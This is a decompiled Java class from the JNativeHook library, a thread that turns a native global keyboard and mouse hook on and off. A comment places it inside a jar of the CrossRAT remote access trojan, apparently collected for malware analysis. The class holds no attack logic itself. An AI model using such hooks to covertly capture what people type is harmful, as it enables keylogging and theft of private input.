package org.jnativehook;

class GlobalScreen$NativeHookThread
  extends Thread
{
  private c a;
  
  public GlobalScreen$NativeHookThread()
  {
    setName("JNativeHook Hook Thread");
    setDaemon(false);
    setPriority(10);
  }
  
  public void run()
  {
    this.a = null;
    try
    {
      enable();
    }
    catch (c localc)
    {
      this.a = localc;
    }
    synchronized (this)
    {
      notifyAll();
      return;
    }
  }
  
  public final c a()
  {
    return this.a;
  }
  
  private native void enable();
  
  public native void disable();
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\org\jnativehook\GlobalScreen$NativeHookThread.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */